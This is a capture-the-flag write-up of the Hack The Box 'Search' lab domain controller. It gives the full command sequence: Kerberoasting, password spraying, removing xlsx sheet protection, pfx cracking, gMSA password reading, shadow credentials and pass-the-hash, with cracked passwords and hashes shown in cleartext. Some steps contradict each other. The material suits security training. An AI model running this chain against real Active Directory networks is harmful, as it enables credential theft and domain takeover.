
# Search

![logo](https://github.com/InfoSec-Crow/Writeups/blob/main/htb/machines/Search/Search.png)

## nmap
    
    ```
    PORT     STATE SERVICE       VERSION
    53/tcp   open  domain        Simple DNS Plus
    80/tcp   open  http          Microsoft IIS httpd 10.0
    |_http-title: Search &mdash; Just Testing IIS
    | http-methods: 
    |   Supported Methods: OPTIONS TRACE GET HEAD POST
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/10.0
    88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-21 09:53:04Z)
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
    |_ssl-date: 2023-10-21T09:54:36+00:00; -14s from scanner time.
    | ssl-cert: Subject: commonName=research
    | Issuer: commonName=search-RESEARCH-CA
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2020-08-11T08:13:35
    | Not valid after:  2030-08-09T08:13:35
    | MD5:   0738:614f:7bc0:29d0:6d1d:9ea6:3cdb:d99e
    |_SHA-1: 10ae:5494:29d6:1e44:276f:b8a2:24ca:fde9:de93:af78
    443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
    |_http-server-header: Microsoft-IIS/10.0
    |_ssl-date: 2023-10-21T09:54:36+00:00; -14s from scanner time.
    | http-methods: 
    |_  Supported Methods: OPTIONS
    | ssl-cert: Subject: commonName=research
    | Issuer: commonName=search-RESEARCH-CA
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2020-08-11T08:13:35
    | Not valid after:  2030-08-09T08:13:35
    | MD5:   0738:614f:7bc0:29d0:6d1d:9ea6:3cdb:d99e
    |_SHA-1: 10ae:5494:29d6:1e44:276f:b8a2:24ca:fde9:de93:af78
    | tls-alpn: 
    |_  http/1.1
    |_http-title: Search &mdash; Just Testing IIS
    445/tcp  open  microsoft-ds?
    464/tcp  open  kpasswd5?
    593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
    |_ssl-date: 2023-10-21T09:54:36+00:00; -14s from scanner time.
    | ssl-cert: Subject: commonName=research
    | Issuer: commonName=search-RESEARCH-CA
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2020-08-11T08:13:35
    | Not valid after:  2030-08-09T08:13:35
    | MD5:   0738:614f:7bc0:29d0:6d1d:9ea6:3cdb:d99e
    |_SHA-1: 10ae:5494:29d6:1e44:276f:b8a2:24ca:fde9:de93:af78
    3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=research
    | Issuer: commonName=search-RESEARCH-CA
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2020-08-11T08:13:35
    | Not valid after:  2030-08-09T08:13:35
    | MD5:   0738:614f:7bc0:29d0:6d1d:9ea6:3cdb:d99e
    |_SHA-1: 10ae:5494:29d6:1e44:276f:b8a2:24ca:fde9:de93:af78
    |_ssl-date: 2023-10-21T09:54:36+00:00; -14s from scanner time.
    3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
    |_ssl-date: 2023-10-21T09:54:36+00:00; -14s from scanner time.
    | ssl-cert: Subject: commonName=research
    | Issuer: commonName=search-RESEARCH-CA
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2020-08-11T08:13:35
    | Not valid after:  2030-08-09T08:13:35
    | MD5:   0738:614f:7bc0:29d0:6d1d:9ea6:3cdb:d99e
    |_SHA-1: 10ae:5494:29d6:1e44:276f:b8a2:24ca:fde9:de93:af78
    Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows
    ```
    

### Dns recon

- `dnsrecon -d search.htb -a -n 10.129.229.57`

```
[*] std: Performing General Enumeration against: search.htb...
[*] Checking for Zone Transfer for search.htb name servers
[*] Resolving SOA Record
[+]      SOA research.search.htb 10.129.229.57
[+]      SOA research.search.htb dead:beef::ce
[+]      SOA research.search.htb dead:beef::68a5:60b7:448f:4283
[*] Resolving NS Records
[*] NS Servers found:
[+]      NS research.search.htb 10.129.229.57
[+]      NS research.search.htb dead:beef::ce
[+]      NS research.search.htb dead:beef::68a5:60b7:448f:4283
[*] Removing any duplicate NS server IP Addresses...
[*]
[*] Trying NS server dead:beef::ce
[-] Zone Transfer Failed for dead:beef::ce!
[-] Port 53 TCP is being filtered
[*]
[*] Trying NS server 10.129.229.57
[+] 10.129.229.57 Has port 53 TCP Open
[-] Zone Transfer Failed (Zone transfer error: REFUSED)
[*]
[*] Trying NS server dead:beef::68a5:60b7:448f:4283
[-] Zone Transfer Failed for dead:beef::68a5:60b7:448f:4283!
[-] Port 53 TCP is being filtered
[*] Checking for Zone Transfer for search.htb name servers
[*] Resolving SOA Record
[+]      SOA research.search.htb 10.129.229.57
[+]      SOA research.search.htb dead:beef::ce
[+]      SOA research.search.htb dead:beef::68a5:60b7:448f:4283
[*] Resolving NS Records
[*] NS Servers found:
[+]      NS research.search.htb 10.129.229.57
[+]      NS research.search.htb dead:beef::ce
[+]      NS research.search.htb dead:beef::68a5:60b7:448f:4283
[*] Removing any duplicate NS server IP Addresses...
[*]
[*] Trying NS server dead:beef::ce
[-] Zone Transfer Failed for dead:beef::ce!
[-] Port 53 TCP is being filtered
[*]
[*] Trying NS server 10.129.229.57
[+] 10.129.229.57 Has port 53 TCP Open
[-] Zone Transfer Failed (Zone transfer error: REFUSED)
[*]
[*] Trying NS server dead:beef::68a5:60b7:448f:4283
[-] Zone Transfer Failed for dead:beef::68a5:60b7:448f:4283!
[-] Port 53 TCP is being filtered
[-] DNSSEC is not configured for search.htb
[*]      SOA research.search.htb 10.129.229.57
[*]      SOA research.search.htb dead:beef::ce
[*]      SOA research.search.htb dead:beef::68a5:60b7:448f:4283
[*]      NS research.search.htb 10.129.229.57
[*]      NS research.search.htb dead:beef::ce
[*]      NS research.search.htb dead:beef::68a5:60b7:448f:4283
[*]      A search.htb 10.10.11.129
[*]      AAAA search.htb dead:beef::250
[*] Enumerating SRV Records
[+]      SRV _gc._tcp.search.htb research.search.htb 10.129.229.57 3268
[+]      SRV _gc._tcp.search.htb research.search.htb dead:beef::68a5:60b7:448f:4283 3268
[+]      SRV _gc._tcp.search.htb research.search.htb dead:beef::ce 3268
[+]      SRV _ldap._tcp.search.htb research.search.htb 10.129.229.57 389
[+]      SRV _ldap._tcp.search.htb research.search.htb dead:beef::ce 389
[+]      SRV _ldap._tcp.search.htb research.search.htb dead:beef::68a5:60b7:448f:4283 389
[+]      SRV _kerberos._udp.search.htb research.search.htb 10.129.229.57 88
[+]      SRV _kerberos._udp.search.htb research.search.htb dead:beef::68a5:60b7:448f:4283 88
[+]      SRV _kerberos._udp.search.htb research.search.htb dead:beef::ce 88
[+]      SRV _kerberos._tcp.search.htb research.search.htb 10.129.229.57 88
[+]      SRV _kerberos._tcp.search.htb research.search.htb dead:beef::ce 88
[+]      SRV _kerberos._tcp.search.htb research.search.htb dead:beef::68a5:60b7:448f:4283 88
[+]      SRV _ldap._tcp.ForestDNSZones.search.htb research.search.htb 10.129.229.57 389
[+]      SRV _ldap._tcp.ForestDNSZones.search.htb research.search.htb dead:beef::ce 389
[+]      SRV _ldap._tcp.ForestDNSZones.search.htb research.search.htb dead:beef::68a5:60b7:448f:4283 389
[+]      SRV _ldap._tcp.gc._msdcs.search.htb research.search.htb 10.129.229.57 3268
[+]      SRV _ldap._tcp.gc._msdcs.search.htb research.search.htb dead:beef::68a5:60b7:448f:4283 3268
[+]      SRV _ldap._tcp.gc._msdcs.search.htb research.search.htb dead:beef::ce 3268
[+]      SRV _ldap._tcp.pdc._msdcs.search.htb research.search.htb 10.129.229.57 389
[+]      SRV _ldap._tcp.pdc._msdcs.search.htb research.search.htb dead:beef::ce 389
[+]      SRV _ldap._tcp.pdc._msdcs.search.htb research.search.htb dead:beef::68a5:60b7:448f:4283 389
[+]      SRV _kpasswd._tcp.search.htb research.search.htb 10.129.229.57 464
[+]      SRV _kpasswd._tcp.search.htb research.search.htb dead:beef::ce 464
[+]      SRV _kpasswd._tcp.search.htb research.search.htb dead:beef::68a5:60b7:448f:4283 464
[+]      SRV _ldap._tcp.dc._msdcs.search.htb research.search.htb 10.129.229.57 389
[+]      SRV _ldap._tcp.dc._msdcs.search.htb research.search.htb dead:beef::68a5:60b7:448f:4283 389
[+]      SRV _ldap._tcp.dc._msdcs.search.htb research.search.htb dead:beef::ce 389
[+]      SRV _kerberos._tcp.dc._msdcs.search.htb research.search.htb 10.129.229.57 88
[+]      SRV _kerberos._tcp.dc._msdcs.search.htb research.search.htb dead:beef::68a5:60b7:448f:4283 88
[+]      SRV _kerberos._tcp.dc._msdcs.search.htb research.search.htb dead:beef::ce 88
[+]      SRV _kpasswd._udp.search.htb research.search.htb 10.129.229.57 464
[+]      SRV _kpasswd._udp.search.htb research.search.htb dead:beef::ce 464
[+]      SRV _kpasswd._udp.search.htb research.search.htb dead:beef::68a5:60b7:448f:4283 464
[+] 33 Records Found
```

### Dirsearch

- [http://search.htb/certsrv/](http://search.htb/certsrv/) - Login

## Kerbrute

We find some usernames on the web page and from the img. Also there is a password on the img.

![Untitled](https://github.com/InfoSec-Crow/Writeups/blob/main/htb/machines/Search/image_on_the_side.png)

Password: IsolationIsKey?

```
Hope Sharp
Keely Lyons
Dax Santiago
Sierra Frye
Kyla Stewart
Kaiara Spencer
Dave Simpson
Ben Thompson
Chris Stewart
```

Crate a user list

- `ruby username-anarchy -f first,first.last,last,flast -i tmp.txt`
- `kerbrute userenum --dc research -d search.htb users.txt`

```
keely.lyons
sierra.frye
dax.santiago
hope.sharp
```

We can login with [hope.sharp](http://hope.sharp) : IsolationIsKey? to smb and ldap

# Bloodhound

- `/opt/WIN/BloodHound/bloodhound.py -ns 10.129.229.57 -c all -d search.htb -u hope.sharp -p 'IsolationIsKey?' --zip`

## Analyse

### Kerberoastable Accounts

User: web_svc

- `crackmapexec ldap research.search.htb -u web_svc -p '' --kerberoasting kerberoasting.out`

```
$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$674346d0aea ...
```

- `hashcat -m 13100 kerberoasting.out /usr/share/wordlists/rockyou.txt`

`web_svc : @3ONEmillionbaby`

### Create Users lists from domain users

- `cat 20231021144226_users.json | jq '.data[].Properties | select( .description != null) | .name + ":" + .description' -r > domain_users.txt`
    
    Remove the @search.htb 
    

## SMB Password spraying

We can try the two passwords for all domain users.

- `crackmapexec smb search.htb -u domain_users.txt -p 'IsolationIsKey?' '@3ONEmillionbaby' --continue-on-success`

```
SMB search.htb  445    RESEARCH   [+] search.htb\EDGAR.JACOBS:@3ONEmillionbaby
```

## SMB Spider Shares

- `cat search.htb.json | jq '. | map_values(keys)'`

```json
"NETLOGON": [],
  "RedirectedFolders$": [
    "edgar.jacobs/Desktop/$RECYCLE.BIN/desktop.ini",
    "edgar.jacobs/Desktop/Microsoft Edge.lnk",
    "edgar.jacobs/Desktop/Phishing_Attempt.xlsx",
    "edgar.jacobs/Desktop/desktop.ini",
    "edgar.jacobs/Documents/$RECYCLE.BIN/desktop.ini",
    "edgar.jacobs/Documents/desktop.ini",
    "edgar.jacobs/Downloads/$RECYCLE.BIN/desktop.ini",
    "edgar.jacobs/Downloads/desktop.ini",
    "sierra.frye/Desktop/$RECYCLE.BIN/desktop.ini",
    "sierra.frye/Desktop/Microsoft Edge.lnk",
    "sierra.frye/Desktop/desktop.ini",
    "sierra.frye/Desktop/user.txt",
    "sierra.frye/user.txt"
```

We can view directorys from user `sierra.frye` but dont read files.

Download the `edgar.jacobs/Desktop/Phishing_Attempt.xlsx`

- `unzip Phishing_Attempt.xlsx`
- `find . | grep sheet`

```
./xl/worksheets
./xl/worksheets/sheet1.xml
./xl/worksheets/_rels
./xl/worksheets/_rels/sheet2.xml.rels
./xl/worksheets/_rels/sheet1.xml.rels
./xl/worksheets/sheet2.xml
```

We need to remove the sheetProtection line.

- `nano ./xl/worksheets/sheet2.xml`

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<SNIP>
Vincent.Sutton</v></c></row><row r="17" spans="3:3" x14ac:dyDescent="0.25"><c r="C17" s="4"/></row></sheetData><sheetProtection algorithmName="SHA-512" hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg==" saltValue="U9oZfaVCkz5jWdhs9AA8nA==" spinCount="100000" sheet="1" objects="1" scenarios="1"/><pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/><pageSetup paperSize="9" orientation="portrait" r:id="rId1"/></worksheet>
```

Save it and zip all files 

- `zip newfile.xlsx -r .`

Now open it and we can view the colum C

![Untitled](https://github.com/InfoSec-Crow/Writeups/blob/main/htb/machines/Search/creds.png)

Create a ph_passwords.txt and a ph_users.txt file, to check, witch username and password pair is valide.

- `crackmapexec smb search.htb -u ph_users.txt -p ph_passwords.txt --no-bruteforce`

```
SMB search.htb 445 RESEARCH [+] search.htb\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18
```

`Sierra.Frye : $$49=wide=STRAIGHT=jordan=28$$18`

We can now read the smb share from the user.

→ user.txt 

# Priv Esc

## Get Certivicat

We find a cert in the SMB share `RedirectedFolders$\sierra.frye\Downloads\Backups\`

```
search-RESEARCH-CA.p12             Ac     2643  Fri Jul 31 17:04:11 2020
staff.pfx                          Ac     4326  Mon Aug 10 22:39:17 2020
```

- `smbclient -U sierra.frye //search.htb/RedirectedFolders$/`

### Cracking

- `/usr/share/john/pfx2john.py staff.pfx  > certhash`
- `john -w=/usr/share/wordlists/rockyou.txt certhash`

Web: `sierra.frye : misspissy`

### Add Cert in Browser

Serach for Security in Settings

![Untitled](https://github.com/InfoSec-Crow/Writeups/blob/main/htb/machines/Search/web_cert.png)

Now we can go to `https://search.htb/staff`

![Untitled](https://github.com/InfoSec-Crow/Writeups/blob/main/htb/machines/Search/web_access.png)

We have now a Powershell. 

## Bloodhound

![Untitled](https://github.com/InfoSec-Crow/Writeups/blob/main/htb/machines/Search/bloodhound.png)

### ACE: ReadGMSAPassword and GenericAll

- `$gmsa = Get-ADServiceAccount -Identity bir-adfs-gmsa -Properties 'msds-managedpassword'`
- `$mp = $gmsa.'msds-managedpassword'`
- `$mp1 = ConvertFrom-ADManagedPasswordBlob $mp`
- `$user = 'BIR-ADFS-GMSA$'`
- `$passwd = $mp1.'CurrentPassword'`
- `$secpass = ConvertTo-SecureString $passwd -AsPlainText -Force
$cred = new-object system.management.automation.PSCredential $user,$secpass`
- `Invoke-Command -computername 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity
tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'Password1234!'
-force)} -Credential $cred`

Now we can run commands with 

```
$SecPassword = ConvertTo-SecureString 'Password1234!' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('search.htb\tristan.davies', $SecPassword) ; Invoke-Command -ComputerName 127.0.0.1 -Credential $credential -ScriptBlock { cmd /c whoami }
```

Or login with 

- `impacket-wmiexec 'search/tristan.davies:Password1234!@10.129.229.57'`

### `Fast Way`

---

## ACE: ReadGMSAPassword

[https://github.com/micahvandeusen/gMSADumper](https://github.com/micahvandeusen/gMSADumper)

- `./gMSADumper.py -u Sierra.Frye -p '$$49=wide=STRAIGHT=jordan=28$$18' -d 'search.htb'`

```
Users or groups who can read password for BIR-ADFS-GMSA$:
 > ITSec
BIR-ADFS-GMSA$:::e1e9fd9e46d0d747e1595167eedcec0f
BIR-ADFS-GMSA$:aes256-cts-hmac-sha1-96:06e03fa99d7a99ee1e58d795dccc7065a08fe7629441e57ce463be2bc51acf38
BIR-ADFS-GMSA$:aes128-cts-hmac-sha1-96:dc4a4346f54c0df29313ff8a21151a42
```

## ACE: GenericAll

### 1. Methode - Kerberoast (Fail)

We can add a SPN to the user and get his hash

https://github.com/ShutdownRepo/targetedKerberoast

- `./targetedKerberoast.py -v -d 'search.htb' -u 'BIR-ADFS-GMSA$' -H e1e9fd9e46d0d747e1595167eedcec0f`

```
krb5tgs$23$*Tristan.Davies$SEARCH.HTB$search.htb/Tristan.Davies*$bb68fdd1cf5aa0 ...
```

- `hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt`

We can crack the hash! 

### 2. Methode - Force Change Password (Work)

- `pth-net rpc password "tristan.davies" "newP@ssword2022" -U "serach.htb"/"BIR-ADFS-GMSA$"%"ffffffffffffffffffffffffffffffff":"e1e9fd9e46d0d747e1595167eedcec0f" -S "research"`

We can now login with 

- `impacket-wmiexec 'search/tristan.davies:newP@ssword2022@10.129.229.57'`

### 3. Methode - Shadow Credentials attack (Work)

- `./pywhisker.py -d "search.htb" -u 'BIR-ADFS-GMSA$' -H e1e9fd9e46d0d747e1595167eedcec0f --target 'tristan.davies' --action "add"`

```
[*] Searching for the target account
[*] Target user found: CN=Tristan Davies,CN=Users,DC=search,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 1ae06a28-034b-a9ac-14a7-18d342cf6c0b
[*] Updating the msDS-KeyCredentialLink attribute of tristan.davies
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: KaXaIC8h.pfx
[*] Must be used with password: 6KsCIMM6Ri789CgxI8IR
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Now remove the password from the cert

[Pass the Certificate](https://www.thehacker.recipes/a-d/movement/kerberos/pass-the-certificate)

- `certipy-ad cert -export -pfx "hgiH7cho.pfx" -password "FI59NFeHMPaB9bj8y1yU" -out "unprotected.pfx"`
- `certipy-ad auth -pfx "unprotected.pfx" -dc-ip 10.129.229.57 -username 'tristan.davies' -domain 'search.htb'`

```
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[!] Could not find identification in the provided certificate
[*] Using principal: tristan.davies@search.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'tristan.davies.ccache'
[*] Trying to retrieve NT hash for 'tristan.davies'
[*] Got hash for 'tristan.davies@search.htb': aad3b435b51404eeaad3b435b51404ee:fb54d1c05e301e024800c6ad99fe9b45
```

- `impacket-wmiexec 'search/tristan.davies@10.129.229.57' -hashes aad3b435b51404eeaad3b435b51404ee:fb54d1c05e301e024800c6ad99fe9b45`

→ root.txt
